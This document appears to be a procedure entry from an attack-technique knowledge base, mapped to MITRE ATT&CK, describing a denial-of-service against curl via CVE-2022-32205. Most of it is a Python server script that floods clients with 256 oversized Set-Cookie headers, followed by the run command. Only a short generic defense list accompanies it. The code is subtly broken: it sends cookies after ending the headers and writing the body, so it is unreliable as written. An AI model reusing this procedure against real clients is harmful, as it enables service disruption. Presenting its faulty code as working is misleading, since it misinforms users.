---
id: proc-1
tags:
  - dos
  - http-server
  - cookies
type: procedure
tools:
  - '[[tools/Python-http-server]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/python-server-excessive-cookies]]'
verified: false
platforms:
  - Linux
  - Unix-like
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:26:37.125Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# Set-Up-Malicious-HTTP-Server-for-Excessive-Cookies

## Summary

This procedure sets up a Python-based HTTP server that responds to GET requests with 256 Set-Cookie headers, each containing large values and a shared domain (hax.invalid), to exploit curl's lack of cookie limits in domain handling.

## Description

In the context of CVE-2022-32205, the server simulates a malicious host that sets unlimited cookies applicable across subdomains. It uses Python's http.server module with a custom handler to send excessive headers, leading to memory issues when curl processes them later. This requires Python 3 installed and runs on localhost port 9000, affecting HTTP/HTTPS from unprivileged ports.

## Requirements

1. Python 3.x installed on Linux/Unix-like system
2. Port 9000 available on 127.0.0.1
3. Basic scripting knowledge to create server.py

## Defense

Defensive measures and detection strategies:

- Monitor for unusual HTTP servers on non-standard ports
- Use network firewalls to block unauthorized local servers
- Log and alert on high-volume Set-Cookie responses

## Objectives

1. Simulate a malicious endpoint for cookie injection
2. Prepare for domain-wide cookie propagation
3. Enable subsequent curl exploitation steps

## Instructions

### Step 1: Create Server Script

**Context**: Write a Python script (server.py) that defines a custom HTTP handler to send 256 Set-Cookie headers on GET requests.

**Command** ([[commands/python-server-excessive-cookies]]):
```bash
# Create server.py with the following content:
from http.server import BaseHTTPRequestHandler, HTTPServer

class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<html><body>Malicious server</body></html>')
        for i in range(256):
            cookie = f'f{i}={"A"*4092}; Domain=hax.invalid'
            self.send_header('Set-Cookie', cookie)
        self.end_headers()  # Note: Headers sent after initial end_headers may need adjustment

if __name__ == '__main__':
    server = HTTPServer(('127.0.0.1', 9000), MyServer)
    print('Server running on 127.0.0.1:9000')
    server.serve_forever()
```

> This script starts an HTTP server that injects 256 large cookies with domain hax.invalid. Expected output: Server listens indefinitely; responds with HTML and cookies to curl requests.

### Step 2: Run the Server

**Context**: Execute the script to start the malicious server.

**Command** ([[commands/python-server-excessive-cookies]]):
```bash
python server.py
```

> Server output: "Server running on 127.0.0.1:9000". Interrupt with Ctrl+C to stop.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Endpoint Denial of Service]]

### Sub-Techniques

- None

## Commands Used

- [[commands/python-server-excessive-cookies]]

## Tools Used

- [[tools/Python-http-server]]

## Tags

- dos
- http-server
- cookies
